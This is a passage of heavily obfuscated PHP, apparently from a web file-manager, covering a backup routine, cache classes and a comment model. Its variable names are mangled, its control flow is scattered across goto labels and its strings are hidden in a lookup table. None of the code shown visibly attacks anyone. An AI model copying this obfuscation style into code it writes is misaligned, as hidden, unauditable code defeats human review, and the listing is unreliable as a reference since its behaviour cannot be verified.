$d‚„¼ àì = !0; $D×Õì„ª·æ = $this->storeIds(); $FÔçõ§¿¤° = 1; goto EİŞ—Œ‹‡¹; CããË£¾³: $Eì…¥Ò‡›õ = array($_SERVER[Ôğ—¤Šµˆ˜ñ£][811] => 1, $_SERVER[Ôğ—¤Šµˆ˜ñ£][490] => time(), $_SERVER[Ôğ—¤Šµˆ˜ñ£][756] => 1, $_SERVER[Ôğ—¤Šµˆ˜ñ£][808] => $DÇ‰éÒ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][800] => $fÉÁ‚•µˆ´, $_SERVER[Ôğ—¤Šµˆ˜ñ£][799] => $fæˆ±‰ëİ¼, $_SERVER[Ôğ—¤Šµˆ˜ñ£][812] => time()); if ($fšÂ˜¦àÛ) { $Eì…¥Ò‡›õ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][809]] = $fËøÔË“àÇ; $Eì…¥Ò‡›õ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][810]] = $eÍØÕˆÇï; } Backup::set($Eì…¥Ò‡›õ); goto E…¦í³ë¤é; E…¦í³ë¤é: $this->_fileFilter($D´è¹ôÛÒ«); return !0; goto fÏóóÔ‰İ; EİŞ—Œ‹‡¹: $B²ÚÕÒ‘ = 1000; $B–‰°òÔ×Ú = $fšÂ˜¦àÛ = 0; $D´è¹ôÛÒ« = array(); goto Cğ¨îã˜; eÊùÀ”ïÅ‰: $DÔØ™»è¢->task[$_SERVER[Ôğ—¤Šµˆ˜ñ£][744]] = $fÉÁ‚•µˆ´; $Eì…¥Ò‡›õ = array($_SERVER[Ôğ—¤Šµˆ˜ñ£][799] => $fæˆ±‰ëİ¼, $_SERVER[Ôğ—¤Šµˆ˜ñ£][800] => $fÉÁ‚•µˆ´, $_SERVER[Ôğ—¤Šµˆ˜ñ£][801] => time()); Backup::set($Eì…¥Ò‡›õ); goto F†‰ ğ¨Àó; Cğ¨îã˜: $eÍØÕˆÇï = $fËøÔË“àÇ = 0; do { $Dè…‹Êï±£ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][802]; $F¥¼ë™™Í½ = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][768])->where($b™£¿¨ÂğÁ)->field($Dè…‹Êï±£)->order($_SERVER[Ôğ—¤Šµˆ˜ñ£][803])->selectPage($B²ÚÕÒ‘, $FÔçõ§¿¤°); $Dåİ¢ŠµÈ¼ = !empty($F¥¼ë™™Í½[$_SERVER[Ôğ—¤Šµˆ˜ñ£][367]]) ? $F¥¼ë™™Í½[$_SERVER[Ôğ—¤Šµˆ˜ñ£][367]] : array(); foreach ($Dåİ¢ŠµÈ¼ as $aßâäŞÕ) { goto D²… ÈôÁ; D²… ÈôÁ: if (!$this->_fileExist($aßâäŞÕ, $D´è¹ôÛÒ«, $D×Õì„ª·æ)) { $fæˆ±‰ëİ¼ -= 1; $fÉÁ‚•µˆ´ -= (int) $aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]]; write_log("\x66\151\x6c\x65\x20\x6e\x6f\x74\x20\x65\170\151\x73\164\x2e\x66\151\154\x65\111\x44\x3a{$aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][461]]}\54\x20\x70\x61\x74\150\72{$aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]]}", $_SERVER[Ôğ—¤Šµˆ˜ñ£][804]); continue; } $cŒ‰ã¾š´Ï = $aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]]; $Cô¡µÁ²Ë£ = "\x7b\x69\157\x3a{$c¼Áæª‰îŠ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][733]]}\175" . substr($cŒ‰ã¾š´Ï, strlen("\173\151\x6f\72{$aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][805]]}\x7d")); goto C‹Ùˆ‰¼Çß; dê½Í‚Ì…ã: if ($B–‰°òÔ×Ú >= 1024 * 1024 * 100) { $Eì…¥Ò‡›õ = array($_SERVER[Ôğ—¤Šµˆ˜ñ£][808] => $DÇ‰éÒ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][809] => $fËøÔË“àÇ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][810] => $eÍØÕˆÇï); Backup::set($Eì…¥Ò‡›õ); $B–‰°òÔ×Ú = $fšÂ˜¦àÛ = 0; } goto f˜Ù¼‚šê¾; Dåğñ‹»äˆ: $B–‰°òÔ×Ú += $aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]]; $fËøÔË“àÇ += 1; $eÍØÕˆÇï += $aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]]; goto dê½Í‚Ì…ã; C‹Ùˆ‰¼Çß: if (IO::exist($Cô¡µÁ²Ë£)) { $DÔØ™»è¢->updateFileEnd($aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][28]], $aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]]); } else { $Cô¡µÁ²Ë£ = get_path_father($Cô¡µÁ²Ë£); IO::mkdir($Cô¡µÁ²Ë£); if (!IO::copy($cŒ‰ã¾š´Ï, $Cô¡µÁ²Ë£, $_SERVER[Ôğ—¤Šµˆ˜ñ£][806])) { write_log($_SERVER[Ôğ—¤Šµˆ˜ñ£][807] . $cŒ‰ã¾š´Ï . $_SERVER[Ôğ—¤Šµˆ˜ñ£][790] . $Cô¡µÁ²Ë£ . $_SERVER[Ôğ—¤Šµˆ˜ñ£][530], $_SERVER[Ôğ—¤Šµˆ˜ñ£][763]); $d‚„¼ àì = !1; break; } } $DÇ‰éÒ = $aßâäŞÕ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][461]]; $fšÂ˜¦àÛ += 1; goto Dåğñ‹»äˆ; f˜Ù¼‚šê¾: } $E­Ğ…ğÃê“ = count($Dåİ¢ŠµÈ¼); $FÔçõ§¿¤°++; } while ($E­Ğ…ğÃê“ == $B²ÚÕÒ‘); $DÔØ™»è¢->end(); goto CããË£¾³; a…—ä£Ğµ: $c¼Áæª‰îŠ = Backup::get(); $DÇ‰éÒ = $c¼Áæª‰îŠ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][291]][$_SERVER[Ôğ—¤Šµˆ˜ñ£][193]][$_SERVER[Ôğ—¤Šµˆ˜ñ£][461]]; $b™£¿¨ÂğÁ = array($_SERVER[Ôğ—¤Šµˆ˜ñ£][462] => array($_SERVER[Ôğ—¤Šµˆ˜ñ£][795], $DÇ‰éÒ), $_SERVER[Ôğ—¤Šµˆ˜ñ£][796] => array($_SERVER[Ôğ—¤Šµˆ˜ñ£][329], $c¼Áæª‰îŠ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][733]])); goto fÙ¼Èî›; fÙ¼Èî›: $fæˆ±‰ëİ¼ = (int) Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][768])->where($b™£¿¨ÂğÁ)->count($_SERVER[Ôğ—¤Šµˆ˜ñ£][461]); $fÉÁ‚•µˆ´ = (int) Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][768])->where($b™£¿¨ÂğÁ)->sum($_SERVER[Ôğ—¤Šµˆ˜ñ£][78]); $DÔØ™»è¢ = new TaskFileTransfer($_SERVER[Ôğ—¤Šµˆ˜ñ£][797], $_SERVER[Ôğ—¤Šµˆ˜ñ£][763], $fæˆ±‰ëİ¼, LNG($_SERVER[Ôğ—¤Šµˆ˜ñ£][764]) . $_SERVER[Ôğ—¤Šµˆ˜ñ£][765] . LNG($_SERVER[Ôğ—¤Šµˆ˜ñ£][798])); goto eÊùÀ”ïÅ‰; fÏóóÔ‰İ: } private function _fileExist($a„Ÿâ„ŒÃ´, &$dòÜµÛ·ªù, $aÓËÁ¥âµ­) { goto eÁ¬ô…ÍÏ; a†ÍäïŠ: if (IO::exist($Cğ‡‹‰¥ëô)) { $dòÜµÛ·ªù[] = $a„Ÿâ„ŒÃ´[$Eªİ½†„[461]]; return !1; } $c¨²èˆƒÖÇ = array($Eªİ½†„[805] => $a„Ÿâ„ŒÃ´[$Eªİ½†„[805]], $Eªİ½†„[76] => array($Eªİ½†„[381], "{$Cğ‡‹‰¥ëô}\45")); $aÀá¿¶ƒñÓ = Model($Eªİ½†„[768])->where($c¨²èˆƒÖÇ)->field($Eªİ½†„[462])->select(); goto F§ÁÎâ±; DÃ·¾‹Ì…Ë: if (!in_array($a„Ÿâ„ŒÃ´[$Eªİ½†„[805]], $aÓËÁ¥âµ­)) { return !1; } if (IO::exist($AàëóØ¸†)) { return !0; } $Cğ‡‹‰¥ëô = get_path_father($AàëóØ¸†); goto a†ÍäïŠ; F§ÁÎâ±: $dòÜµÛ·ªù = array_merge($dòÜµÛ·ªù, array_to_keyvalue($aÀá¿¶ƒñÓ, $Eªİ½†„[33], $Eªİ½†„[461])); return !1; goto e»‹…è¥Â±; eÁ¬ô…ÍÏ: $Eªİ½†„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AàëóØ¸† = $a„Ÿâ„ŒÃ´[$Eªİ½†„[76]]; if (in_array($a„Ÿâ„ŒÃ´[$Eªİ½†„[461]], $dòÜµÛ·ªù)) { return !1; } goto DÃ·¾‹Ì…Ë; e»‹…è¥Â±: } private function _fileFilter($CŒ«œ¯¢ª) { $f Õ©ˆ¦Ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($CŒ«œ¯¢ª)) { return; } $A„ÎÒ¨·¸¡ = array($f Õ©ˆ¦Ì[461] => array($f Õ©ˆ¦Ì[7], array_unique($CŒ«œ¯¢ª))); $bÃ›ïÇç‹ = Model($f Õ©ˆ¦Ì[813])->where($A„ÎÒ¨·¸¡)->field($f Õ©ˆ¦Ì[397])->select(); foreach ($bÃ›ïÇç‹ as $A÷Øä‹š) { Model($f Õ©ˆ¦Ì[813])->remove($A÷Øä‹š[$f Õ©ˆ¦Ì[397]], !1); } } private function storeIds() { $D¢»Ù§è‹· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a’…ˆîÑÉ = Model($D¢»Ù§è‹·[748])->listData(); $d¼¶Ä¦‰» = array(); $e‹­¡êë = $GLOBALS[$D¢»Ù§è‹·[6]][$D¢»Ù§è‹·[88]][$D¢»Ù§è‹·[814]]; foreach ($a’…ˆîÑÉ as $FÎ©Ï‡Œâµ) { $aÈºÙ¯‡¬ = strtolower($FÎ©Ï‡Œâµ[$D¢»Ù§è‹·[94]]); if (!isset($e‹­¡êë[$aÈºÙ¯‡¬])) { continue; } $c‚İÎæÃ = $D¢»Ù§è‹·[72] . (isset($e‹­¡êë[$aÈºÙ¯‡¬]) ? $e‹­¡êë[$aÈºÙ¯‡¬] : ucfirst($aÈºÙ¯‡¬)); if (!class_exists($c‚İÎæÃ)) { continue; } $d¼¶Ä¦‰»[] = $FÎ©Ï‡Œâµ[$D¢»Ù§è‹·[395]]; } return $d¼¶Ä¦‰»; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto DáÔÂ”º˜; FäïÁ¦»ø: $c”„Äá×Ó = $GLOBALS[$AÍÈ«†°ß‡[6]][$AÍÈ«†°ß‡[347]]; $f—¯¯Ó›…Ú = $c”„Äá×Ó[$c”„Äá×Ó[$AÍÈ«†°ß‡[815]]]; $Dæõª¿ÊÚÍ = $c”„Äá×Ó[$AÍÈ«†°ß‡[816]]; goto eÚµ‡§†ÂÈ; DáÔÂ”º˜: $AÍÈ«†°ß‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto FäïÁ¦»ø; eÚµ‡§†ÂÈ: switch ($c”„Äá×Ó[$AÍÈ«†°ß‡[815]]) { case $AÍÈ«†°ß‡[17]: self::$handle = Model($AÍÈ«†°ß‡[817]); break; case $AÍÈ«†°ß‡[818]: self::$handle = new CacheRedis($f—¯¯Ó›…Ú, $Dæõª¿ÊÚÍ); break; case $AÍÈ«†°ß‡[819]: self::$handle = new CacheMemcached($f—¯¯Ó›…Ú, $Dæõª¿ÊÚÍ); break; case $AÍÈ«†°ß‡[193]: self::$handle = new CacheFile($f—¯¯Ó›…Ú, $Dæõª¿ÊÚÍ); break; default: break; } return self::$handle; goto A££”§›­; A££”§›­: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($c‘¾ä¡Šê) { if (is_array($c‘¾ä¡Šê) || is_object($c‘¾ä¡Šê)) { $c‘¾ä¡Šê = json_encode($c‘¾ä¡Šê); } $c‘¾ä¡Šê = rawurlencode($c‘¾ä¡Šê); return md5(KOD_SITE_ID . $_SERVER[Ôğ—¤Šµˆ˜ñ£][71] . $c‘¾ä¡Šê); } public static function get($D…°š‘âáá, $EÊ¶œ«İ‰¶ = false) { $CÑéÁ‡‰¾î = self::key($D…°š‘âáá); if ($EÊ¶œ«İ‰¶) { return unserialize(self::init()->get($CÑéÁ‡‰¾î)); } if (!isset(self::$memoryCache[$CÑéÁ‡‰¾î])) { $bªËÃò’Âí = self::init()->get($CÑéÁ‡‰¾î); self::$memoryCache[$CÑéÁ‡‰¾î] = unserialize($bªËÃò’Âí); } return self::$memoryCache[$CÑéÁ‡‰¾î]; } public static function set($cØ¥ç¼ƒ¹˜, $Aß«•¯ÒÍ, $eœáÍ›º÷§ = false) { goto CôÉˆ£¥¹; c¯ƒÛ›†Ã: CacheLock::lock($cØ¥ç¼ƒ¹˜); $dö½ç¯ÛŞ„ = self::init()->set($eååƒ©”‚Ô, serialize($Aß«•¯ÒÍ), $eœáÍ›º÷§); self::$memoryCache[$eååƒ©”‚Ô] = $Aß«•¯ÒÍ; goto DÔß÷Õˆ; DÔß÷Õˆ: CacheLock::unlock($cØ¥ç¼ƒ¹˜); return $dö½ç¯ÛŞ„; goto aÉ’¬¡Ø´Ÿ; CôÉˆ£¥¹: $eååƒ©”‚Ô = self::key($cØ¥ç¼ƒ¹˜); if (isset(self::$memoryCache[$eååƒ©”‚Ô]) && self::$memoryCache[$eååƒ©”‚Ô] === $Aß«•¯ÒÍ) { return !0; } if ($eœáÍ›º÷§ === 0) { self::$memoryCache[$eååƒ©”‚Ô] = $Aß«•¯ÒÍ; return !0; } goto c¯ƒÛ›†Ã; aÉ’¬¡Ø´Ÿ: } public static function getCall($C’”Âç®Ÿ, $fœ½ôÉ¬œ, $fÉˆ¾ÒƒœÑ, $cïÁšõ×Ğ = array()) { goto dá £…; dàŠ˜íÊ: $DŠŞ›§‰è± = call_user_func_array($fÉˆ¾ÒƒœÑ, $cïÁšõ×Ğ); $DŠŞ›§‰è± = $DŠŞ›§‰è± ? $DŠŞ›§‰è± : $eŠ­– ŞĞ‘[33]; self::set($C’”Âç®Ÿ, $DŠŞ›§‰è±, $fœ½ôÉ¬œ); goto AÛŠëºÓâ; AÛŠëºÓâ: return $DŠŞ›§‰è±; goto a²‘³ÒÇÚ; dá £…: $eŠ­– ŞĞ‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DŠŞ›§‰è± = self::get($C’”Âç®Ÿ); if ($DŠŞ›§‰è± || $DŠŞ›§‰è± === $eŠ­– ŞĞ‘[33]) { return $DŠŞ›§‰è±; } goto dàŠ˜íÊ; a²‘³ÒÇÚ: } public static function remove($dÕÇŠ¹ø†Á) { goto føÎÍÆ«å“; føÎÍÆ«å“: $EÕ‹¨¹áˆÄ = self::key($dÕÇŠ¹ø†Á); unset(self::$memoryCache[$EÕ‹¨¹áˆÄ]); self::clearTimeout(); goto c…â‘À­ïá; c…â‘À­ïá: CacheLock::lock($dÕÇŠ¹ø†Á); $E›ö”¸“¥ = self::init()->remove($EÕ‹¨¹áˆÄ); CacheLock::unlock($dÕÇŠ¹ø†Á); goto dó‡õ¾µëã; dó‡õ¾µëã: return $E›ö”¸“¥; goto eæ‡÷ÑĞË; eæ‡÷ÑĞË: } public static function removeMemory($FÈ‰©ÉÊ•) { $cª£Ô„îÅ = self::key($FÈ‰©ÉÊ•); unset(self::$memoryCache[$cª£Ô„îÅ]); } public static function clearMemory($D¢öù•ø•‰ = false) { if ($D¢öù•ø•‰) { $D¢öù•ø•‰ = self::key($D¢öù•ø•‰); unset(self::$memoryCache[$D¢öù•ø•‰]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ôğ—¤Šµˆ˜ñ£][820])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ôğ—¤Šµˆ˜ñ£][821])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Bï ½ÎùêŸ, $fÚÁ‹¿‹¯Ä) { $A¤ƒ İÍóŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->cachePath = $Bï ½ÎùêŸ[$A¤ƒ İÍóŠ[76]]; $this->prefix = $A¤ƒ İÍóŠ[822]; $this->cacheTime = $fÚÁ‹¿‹¯Ä; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($d™°é•è„) { $c¿õ¾ÕöÓ¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d™°é•è„ = str_replace(array($c¿õ¾ÕöÓ¸[823], $c¿õ¾ÕöÓ¸[97], $c¿õ¾ÕöÓ¸[70]), $c¿õ¾ÕöÓ¸[824], $d™°é•è„); return $this->cachePath . $c¿õ¾ÕöÓ¸[825] . $d™°é•è„ . $c¿õ¾ÕöÓ¸[826]; } public function set($AÖ¡Å‰Œø, $C®äÆÑÃƒ¬, $aíÄ¢¼ÎÄµ = false) { $A–ø•×™¼ = $this->getFile($AÖ¡Å‰Œø); if (file_put_contents($A–ø•×™¼, $this->prefix . $C®äÆÑÃƒ¬, LOCK_EX)) { @touch($A–ø•×™¼, intval(time() + $aíÄ¢¼ÎÄµ)); clearstatcache(); return !0; } @unlink($A–ø•×™¼); return !1; } public function get($dğ³ÆÊŠÚ) { $f‹ø¿Ø®Îç = $this->getFile($dğ³ÆÊŠÚ); if (file_exists($f‹ø¿Ø®Îç) && filemtime($f‹ø¿Ø®Îç) < time()) { @unlink($f‹ø¿Ø®Îç); return !1; } $bæÆ»†ì‹ï = @file_get_contents($f‹ø¿Ø®Îç); return substr($bæÆ»†ì‹ï, strlen($this->prefix)); } public function remove($e®¹æŠˆ²) { $C¸¤˜‘ì« = $this->getFile($e®¹æŠˆ²); return @unlink($C¸¤˜‘ì«); } public function deleteAll() { $aØÖˆèĞŸÛ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Dè³æÎ = scandir($this->cachePath); foreach ($Dè³æÎ as $dÄ®Ô¸íùË) { $B³Ğ‹Öá„ = $this->cachePath . $dÄ®Ô¸íùË; if (strpos($B³Ğ‹Öá„, $aØÖˆèĞŸÛ[826]) && strpos($B³Ğ‹Öá„, $aØÖˆèĞŸÛ[827])) { @unlink($B³Ğ‹Öá„); } } } public function clearTimeout() { $A‰¶ñˆ£³Å =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÓİ¦ï•Ş¤ = scandir($this->cachePath); foreach ($BÓİ¦ï•Ş¤ as $f”Ïµ¾ÚÒ´) { $CÆğôĞß— = $this->cachePath . $f”Ïµ¾ÚÒ´; if (strpos($CÆğôĞß—, $A‰¶ñˆ£³Å[826]) && strpos($CÆğôĞß—, $A‰¶ñˆ£³Å[827]) && filemtime($CÆğôĞß—) < time()) { @unlink($CÆğôĞß—); } } } } goto Fº—½„ä¼Ø; C‡„×áïÎ: class CacheLockRedis { public function lock($C‡°¨Õ£¿–, $EèšŒ–ŒìÅ = 10) { $f‘«–ÛÈéÙ = Cache::init(); $fÙç³Šš£î = microtime(!0) + $EèšŒ–ŒìÅ; while (microtime(!0) < $fÙç³Šš£î) { $Bó…ì±î® = $f‘«–ÛÈéÙ->get($C‡°¨Õ£¿–); if (!$Bó…ì±î®) { $fÜ¹Ï˜Š‚ = $f‘«–ÛÈéÙ->setLock($C‡°¨Õ£¿–, $fÙç³Šš£î, $EèšŒ–ŒìÅ); if ($fÜ¹Ï˜Š‚) { return !0; } } else { if ($Bó…ì±î® < microtime(!0)) { $f‘«–ÛÈéÙ->set($C‡°¨Õ£¿–, $fÙç³Šš£î, $EèšŒ–ŒìÅ * 2); if ($f‘«–ÛÈéÙ->get($C‡°¨Õ£¿–) === $Bó…ì±î®) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($aóÒÁğèñ¾) { return Cache::init()->get($aóÒÁğèñ¾); } public function unlock($e«Ú×˜ŞÌß) { return Cache::init()->remove($e«Ú×˜ŞÌß); } } class CacheLockMemcached { public function lock($b¬‚‚ÍŠ±, $f×§¯ôŒÂä = 0) { $D•²·Ø¨±› = Cache::init(); $a‘Œ˜òô¡Ø = microtime(!0) + $f×§¯ôŒÂä; while (microtime(!0) < $a‘Œ˜òô¡Ø) { $CÑµšˆŠ½ = $D•²·Ø¨±›->get($b¬‚‚ÍŠ±); if (!$CÑµšˆŠ½ || $CÑµšˆŠ½ < microtime(!0)) { $Bù–àˆ‰óÍ = $D•²·Ø¨±›->handle->add($b¬‚‚ÍŠ±, $a‘Œ˜òô¡Ø, $f×§¯ôŒÂä); if ($Bù–àˆ‰óÍ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($E‘ÅØ½Ìå) { return Cache::init()->get($E‘ÅØ½Ìå); } public function unlock($D¬Û×øÓ÷) { return Cache::init()->remove($D¬Û×øÓ÷); } } class CacheLockDatabase { public function lock($f¼¹‹Á”ï, $b¦ºš¢¨å„ = 0) { $Ağ¬ë•í¯ = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][817]); $fŒ´Ö“¨ = microtime(!0) + $b¦ºš¢¨å„; while (microtime(!0) < $fŒ´Ö“¨) { $fÚàó•Âƒ = $Ağ¬ë•í¯->get($f¼¹‹Á”ï); if (!$fÚàó•Âƒ || $fÚàó•Âƒ < microtime(!0)) { $EÅ´×Õèñ¥ = $Ağ¬ë•í¯->set($f¼¹‹Á”ï, $fŒ´Ö“¨); if ($EÅ´×Õèñ¥) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($A¶ø¬™†) { return Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][817])->get($A¶ø¬™†); } public function unlock($eé¶¤ŠñÙª) { Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][817])->remove($eé¶¤ŠñÙª); } } goto Dˆ¸Ãä¨Æ†; Cí¾‡ò·×±: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\x65\156\164"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\155\x65" => "\143\x6f\x6d\155\x65\x6e\x74\x5f\155\145\x74\141", "\155\x65\164\x61\106\151\x65\154\144" => "\x63\157\155\155\x65\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($e†‘‹¶¥¸) { $eİ¡“ŠË¬ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($e†‘‹¶¥¸[$eİ¡“ŠË¬[1747]]) { $eåš¤ƒ¦À = $this->where(array($eİ¡“ŠË¬[1748] => $e†‘‹¶¥¸[$eİ¡“ŠË¬[1747]]))->find(); if (!$eåš¤ƒ¦À || $eåš¤ƒ¦À[$eİ¡“ŠË¬[406]] != $e†‘‹¶¥¸[$eİ¡“ŠË¬[406]] || $eåš¤ƒ¦À[$eİ¡“ŠË¬[498]] != $e†‘‹¶¥¸[$eİ¡“ŠË¬[498]]) { return !1; } $this->where(array($eİ¡“ŠË¬[1748] => $e†‘‹¶¥¸[$eİ¡“ŠË¬[1747]]))->setAdd($eİ¡“ŠË¬[1749], 1); } $e†‘‹¶¥¸[$eİ¡“ŠË¬[1750]] = 0; $e†‘‹¶¥¸[$eİ¡“ŠË¬[1749]] = 0; $e†‘‹¶¥¸[$eİ¡“ŠË¬[731]] = 1; return $this->add($e†‘‹¶¥¸); } public function commentCount($DÓ´ÃÃç©, $cçšÇŠæ°Ó, $bøôÂ†¥Ï = false) { goto D–ß¦‘ÇÒè; e„“ÎÔù„÷: $dĞ˜æ£á¡Ä = array($FŠ‚åÁğ¥[498], $FŠ‚åÁğ¥[1751] => $FŠ‚åÁğ¥[494]); $e‰ÊÆ§²¿ = array($FŠ‚åÁğ¥[498] => array($FŠ‚åÁğ¥[7], $DÓ´ÃÃç©), $FŠ‚åÁğ¥[406] => $cçšÇŠæ°Ó); if ($bøôÂ†¥Ï) { $e‰ÊÆ§²¿[$FŠ‚åÁğ¥[1550]] = $bøôÂ†¥Ï; } goto BˆÀ¬¨§ñ„; D–ß¦‘ÇÒè: $FŠ‚åÁğ¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$DÓ´ÃÃç©) { return array(); } if (is_string($DÓ´ÃÃç©) || is_int($DÓ´ÃÃç©)) { $DÓ´ÃÃç© = array($DÓ´ÃÃç©); } goto e„“ÎÔù„÷; BˆÀ¬¨§ñ„: $bÂÆÑ‚–†¿ = $this->field($dĞ˜æ£á¡Ä)->where($e‰ÊÆ§²¿)->group($FŠ‚åÁğ¥[498])->select(); return array_to_keyvalue($bÂÆÑ‚–†¿, $FŠ‚åÁğ¥[498], $FŠ‚åÁğ¥[494]); goto FŠ„å´ê‰Ò; FŠ„å´ê‰Ò: } public function starTarget($E‡¥ğÒçÉé, $F½ŞèÑ¯îÁ) { goto aÌŠ½Ïƒ”°; FÀ­™‚¬¿­: $bøèÜòÀì = $this->where($eˆò¿ŸíÏ…)->find(); if ($bøèÜòÀì) { return $this->where(array($e»µï¡çöª[395] => $bøèÜòÀì[$e»µï¡çöª[395]]))->delete(); } $F‡©Ä±Ç³† = array($e»µï¡çöª[1747] => 0, $e»µï¡çöª[1550] => USER_ID, $e»µï¡çöª[731] => 1, $e»µï¡çöª[736] => $e»µï¡çöª[33], $e»µï¡çöª[406] => $fæÚ“‡Ç“, $e»µï¡çöª[498] => $F½ŞèÑ¯îÁ, $e»µï¡çöª[1750] => 0, $e»µï¡çöª[1749] => 0); goto a—œ”ğğ“¿; aÌŠ½Ïƒ”°: $e»µï¡çöª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fæÚ“‡Ç“ = $E‡¥ğÒçÉé + self::TYPE_STAR_OFFSET; $eˆò¿ŸíÏ… = array($e»µï¡çöª[1550] => USER_ID, $e»µï¡çöª[406] => $fæÚ“‡Ç“, $e»µï¡çöª[498] => $F½ŞèÑ¯îÁ); goto FÀ­™‚¬¿­; a—œ”ğğ“¿: return $this->add($F‡©Ä±Ç³†); goto Dª½µÚœ†‘; Dª½µÚœ†‘: } public function starTargetCount($EÍìˆÙ¤õ­, $CÕˆàƒô‹) { $B¨¥¬—­• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÚÆ„¸‘â = $CÕˆàƒô‹ + self::TYPE_STAR_OFFSET; $aµÓ¹ò£Ê¼ = $this->commentCount($EÍìˆÙ¤õ­, $eÚÆ„¸‘â); $BÓ†¦é¨¯‰ = $this->commentCount($EÍìˆÙ¤õ­, $eÚÆ„¸‘â, USER_ID); return array($B¨¥¬—­•[1752] => $aµÓ¹ò£Ê¼, $B¨¥¬—­•[1753] => $BÓ†¦é¨¯‰); } public function starTargetUserList($dáåš‡ğ…Ù, $a‰Á’è¦º) { goto D‚Â“Ë—Ïƒ; e«…¯ ­: return $CÅ¨¢­éŠ; goto F³õ¶¯¾ƒù; déî®¢°¤‰: $D›¤¼İñÛ  = $this->field($aŠïÁ±ÚŸ”[1550])->where($BãöÁµÇ…)->limit(500)->select(); $D›¤¼İñÛ  = array_to_keyvalue($D›¤¼İñÛ , $aŠïÁ±ÚŸ”[33], $aŠïÁ±ÚŸ”[1550]); $CÅ¨¢­éŠ[$aŠïÁ±ÚŸ”[1754]] = Model($aŠïÁ±ÚŸ”[507])->userListInfo($D›¤¼İñÛ ); goto e«…¯ ­; D‚Â“Ë—Ïƒ: $aŠïÁ±ÚŸ” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D…éÕí» = $dáåš‡ğ…Ù + self::TYPE_STAR_OFFSET; $BãöÁµÇ… = array($aŠïÁ±ÚŸ”[498] => $a‰Á’è¦º, $aŠïÁ±ÚŸ”[406] => $D…éÕí»); goto FèÀ±Ò˜…; FèÀ±Ò˜…: $aãš—À½ğ = $this->where($BãöÁµÇ…)->count(); $CÅ¨¢­éŠ = array($aŠïÁ±ÚŸ”[253] => $aãš—À½ğ, $aŠïÁ±ÚŸ”[1754] => array()); if (!$aãš—À½ğ) { return $CÅ¨¢­éŠ; } goto déî®¢°¤‰; F³õ¶¯¾ƒù: } public function prasiseUserList($c«İ…®é•) { goto f‚Í‰ù‚ô¡; a×Š‰ãµ: $DÓÚŠ»ÈÕ = Model($C‘Î¥Æ˜[1756])->field($C‘Î¥Æ˜[1550])->where($A¶Ç…ÔÑ)->limit(500)->select(); $DÓÚŠ»ÈÕ = array_to_keyvalue($DÓÚŠ»ÈÕ, $C‘Î¥Æ˜[33], $C‘Î¥Æ˜[1550]); $dåãË¼Ò´µ[$C‘Î¥Æ˜[1754]] = Model($C‘Î¥Æ˜[507])->userListInfo($DÓÚŠ»ÈÕ); goto aÆ“İï–›; aÆ“İï–›: return $dåãË¼Ò´µ; goto fÎÀİÅµ‹±; E„õÇâ±¡: $cŠ„ªõ÷¨ = _get($aæÍíˆÜ††, $C‘Î¥Æ˜[1750], 0); $dåãË¼Ò´µ = 